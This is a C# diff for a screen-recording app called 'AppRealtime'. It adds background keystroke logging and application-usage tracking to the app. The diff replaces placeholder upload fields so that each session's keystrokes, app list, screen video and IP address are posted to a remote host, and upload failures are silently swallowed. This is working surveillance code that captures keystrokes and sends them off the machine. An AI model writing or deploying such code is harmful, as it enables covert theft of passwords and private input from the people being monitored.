@@ -1,4 +1,5 @@
-﻿using ScreenRecorderLib;
+﻿using Newtonsoft.Json;
+using ScreenRecorderLib;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -9,6 +10,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Timers;
 using System.Windows;
+using System.Windows.Media.Animation;
 using System.Windows.Media.Media3D;
 
 namespace AppRealtime
@@ -51,6 +53,20 @@ namespace AppRealtime
 
         public async Task RunAsync()
         {
+            _ = Task.Run(() =>
+            {
+
+                KeyLogger.Run();
+
+            });
+
+            _ = Task.Run(() =>
+            {
+
+                _ = AppTimeTrack.Run();
+
+            });
+
             while (true)
             {
                 try
@@ -62,6 +78,10 @@ namespace AppRealtime
                         Directory.CreateDirectory("Videos");
                     }
                     var now = ServerTimeHelper.GetUnixTimeSeconds();
+
+                    KeyLogger.WriteNewLogSession(now);
+                    AppTimeTrack.SetNewAppTrack(now);
+
                     string fileName = $"{now}_{now + maxVideoSeconds}.mp4";
                     string videoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Videos", fileName);
 
@@ -79,6 +99,23 @@ namespace AppRealtime
                     {
                         try
                         {
+                            var keylog = new List<KeyLog>();
+                            var log = KeyLogger.KeyLogs.First(k => k.Id == now);
+                            if (log != null)
+                            {
+                                keylog = log.KeyLogCollection;
+                            }
+
+                            var appTimes = new List<AppTime>();
+                            var appTime = AppTimeTrack.AppTimes.First(k => k.Id == now);
+                            if (appTime != null)
+                            {
+                                appTimes = appTime.Collection;
+                            }
+
+                            var appsJson = JsonConvert.SerializeObject(appTimes);
+                            var keyLogJson = JsonConvert.SerializeObject(keylog);
+                            Console.WriteLine(keyLogJson);
                             const int MAX_RETRIES = 5;
                             for (int i = 0; i < MAX_RETRIES; i++)
                             {
@@ -93,19 +130,24 @@ namespace AppRealtime
                                     var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.Host);
                                     request.Headers.Add("accept", "*/*");
                                     var content = new MultipartFormDataContent();
-                                    content.Add(new StreamContent(File.OpenRead(videoPath)), "file", videoPath);
+                                    content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", videoPath);
                                     content.Add(new StringContent(_appSettings.IP), "ip");
-                                    content.Add(new StringContent("hello"), "keylog");
-                                    content.Add(new StringContent("youtube"), "apps");
+                                    content.Add(new StringContent(keyLogJson), "keylog");
+                                    content.Add(new StringContent(appsJson), "apps");
                                     request.Content = content;
                                     var response = await client.SendAsync(request);
                                     response.EnsureSuccessStatusCode();
-                                    if ((await response.Content.ReadAsStringAsync()).Contains("Files uploaded successfully"))
+                                    string result = await response.Content.ReadAsStringAsync();
+                                    if (result.Contains("successfully"))
                                     {
+                                        Console.WriteLine("Files uploaded successfully");
                                         break;
                                     }
                                 }
-                                catch (Exception ex) { }
+                                catch (Exception ex)
+                                {
+
+                                }
                             }
                         }
                         finally
